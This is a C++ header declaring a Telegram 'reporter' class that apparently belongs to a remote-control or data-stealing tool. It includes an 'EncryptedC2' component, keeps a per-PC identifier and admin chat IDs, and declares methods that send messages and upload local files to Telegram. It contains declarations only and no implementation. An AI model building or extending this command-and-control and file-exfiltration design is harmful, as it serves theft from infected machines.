#pragma once

#include <mutex>
#include <string>
#include <vector>
#include <memory>

#include "application/interfaces/IReporter.hpp"
#include "domain/common/EncryptedC2.hpp"

namespace nuub::infrastructure::telegram {

class TelegramReporter final : public application::interfaces::IReporter {
    std::string token_;
    std::int64_t chat_id_;         // Primary chat ID (backward compat)
    std::vector<std::int64_t> all_chat_ids_;  // All admin chat IDs
    std::string pc_id_;
    std::mutex curl_mutex_;
    std::unique_ptr<domain::EncryptedChannel> encryption_;

    std::string api_call(const std::string& method, const std::string& params);
    void send_to_chat(std::int64_t chat_id, const std::string& text);

public:
    TelegramReporter(std::string token, std::int64_t chat_id, std::string pc_id);
    TelegramReporter(std::string token, std::int64_t chat_id, std::string pc_id,
                     const std::string& encryption_key);
    TelegramReporter(std::string token, std::vector<std::int64_t> chat_ids,
                     std::string pc_id, const std::string& encryption_key = "");

    void send_message(const std::string& text) override;
    bool send_file(const std::string& path, const std::string& caption = "") override;

    bool is_encrypted() const { return encryption_ != nullptr; }
};

} // namespace nuub::infrastructure::telegram
